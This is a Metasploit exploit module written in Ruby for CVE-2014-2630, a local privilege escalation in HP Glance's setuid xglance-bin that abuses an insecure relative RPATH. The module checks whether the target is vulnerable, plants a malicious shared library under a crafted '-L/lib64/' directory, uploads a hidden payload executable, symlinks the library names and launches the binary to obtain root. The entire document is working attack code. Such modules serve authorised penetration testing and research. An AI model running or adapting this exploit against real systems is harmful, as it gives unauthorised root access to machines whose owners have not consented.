# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Compile
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;HP Performance Monitoring xglance Priv Esc&#039;,
        &#039;Description&#039; => %q{
          This exploit takes advantage of xglance-bin, part of
          HP&#039;s Glance (or Performance Monitoring) version 11 &#039;and subsequent&#039;
          , which was compiled with an insecure RPATH option.  The RPATH includes
          a relative path to -L/lib64/ which can be controlled by a user.
          Creating libraries in this location will result in an
          escalation of privileges to root.
        },
        &#039;License&#039; => MSF_LICENSE,
        &#039;Author&#039; =>
          [
            &#039;h00die&#039;, # msf module
            &#039;Tim Brown&#039;, # original finding
            &#039;Robert Jaroszuk&#039;, # exploit
            &#039;Marco Ortisi&#039;, # exploit
          ],
        &#039;Platform&#039; => [ &#039;linux&#039; ],
        &#039;Arch&#039; => [ ARCH_X86, ARCH_X64 ],
        &#039;Targets&#039; =>
          [
            [ &#039;Automatic&#039;, {} ],
            [ &#039;Linux x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
            [ &#039;Linux x64&#039;, { &#039;Arch&#039; => ARCH_X64 } ]
          ],
        &#039;Privileged&#039; => true,
        &#039;References&#039; =>
          [
            [ &#039;EDB&#039;, &#039;48000&#039; ],
            [ &#039;URL&#039;, &#039;https://seclists.org/fulldisclosure/2014/Nov/55&#039; ], # permissions, original finding
            [ &#039;URL&#039;, &#039;https://www.redtimmy.com/linux-hacking/perf-exploiter/&#039; ], # exploit
            [ &#039;URL&#039;, &#039;https://github.com/redtimmy/perf-exploiter&#039; ],
            [ &#039;PACKETSTORM&#039;, &#039;156206&#039; ],
            [ &#039;URL&#039;, &#039;https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2630/&#039; ],
            [ &#039;CVE&#039;, &#039;2014-2630&#039; ]
          ],
        &#039;DisclosureDate&#039; => &#039;Nov 19 2014&#039;,
        &#039;DefaultTarget&#039; => 0
      )
    )
    register_options [
      OptString.new(&#039;GLANCE_PATH&#039;, [ true, &#039;Path to xglance-bin&#039;, &#039;/opt/perf/bin/xglance-bin&#039; ])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [ false, &#039;Override check result&#039;, false ]),
      OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
    ]

  end

  # Simplify pulling the writable directory variable
  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def exploit_folder
    "#{base_dir}/-L/lib64/"
  end

  def glance_path
    datastore[&#039;GLANCE_PATH&#039;].to_s
  end

  # Pull the exploit binary or file (.c typically) from our system
  def exploit_data(file)
    ::File.binread ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2014-2630&#039;, file)
  end

  def find_libs
    libs = cmd_exec "ldd #{glance_path} | grep libX"
    %r{(?<lib>libX.+\.so\.\d) => -L/lib64} =~ libs
    return nil if lib.nil?

    lib
  end

  def check
    unless setuid? glance_path
      vprint_error "#{glance_path} not found on system"
      return CheckCode::Safe
    end
    lib = find_libs
    if lib.nil?
      vprint_error &#039;Patched xglance-bin, not linked to -L/lib64/&#039;
      return CheckCode::Safe
    end
    vprint_good "xglance-bin found, and linked to vulnerable relative path -L/lib64/ through #{lib}"
    CheckCode::Appears
  end

  def exploit
    unless check == CheckCode::Appears
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    vprint_status("Deleting exploit folder: #{base_dir}/-L")
    rm_cmd = "rm -rf \"#{base_dir}/-L\""
    cmd_exec(rm_cmd)
    # make folder
    vprint_status("Creating exploit folder: #{exploit_folder}")
    cmd_exec "mkdir -p #{exploit_folder}"
    register_dir_for_cleanup "#{base_dir}/-L"

    # drop our .so on the system that calls our payload
    # we need gcc to compile instead of metasm since metasm
    # removes unused variables, which we need to keep xglance-bin
    # from breaking and not launching our exploit
    so_file = "#{exploit_folder}libXm.so.3"
    if live_compile?
      vprint_status &#039;Live compiling exploit on system...&#039;
      payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
      code = exploit_data(&#039;CVE-2014-2630.c&#039;)
      code.sub!(&#039;#{payload_path}&#039;, payload_path) # inject our payload path
      upload_and_compile so_file, code, &#039;-fPIC -shared -static-libgcc&#039;
      rm_f "#{so_file}.c"
    else
      payload_path = &#039;/tmp/.u4aLoiq&#039;
      upload_and_chmodx so_file, exploit_data(&#039;libXm.so.3&#039;)
    end

    # Upload payload executable
    vprint_status &#039;uploading payload&#039;
    upload_and_chmodx payload_path, generate_payload_exe

    # link so files to exploit vuln
    lib = find_libs
    # just to be safe, Xt and Xp were in the original exploit
    # our mock binary is also exploitsable through libXmu.so.6
    # unsure about the real binary
    cd exploit_folder
    [&#039;libXp.so.6&#039;, &#039;libXt.so.6&#039;, &#039;libXmu.so.6&#039;, lib].each do |l|
      cmd_exec "ln -s libXm.so.3 #{l}"
    end

    # Launch exploit
    print_status &#039;Launching xglance-bin...&#039;
    cd base_dir
    output = cmd_exec glance_path
    output.each_line { |line| vprint_status line.chomp }
    print_warning("Manual cleanup of #{exploit_folder} may be required")
  end
end

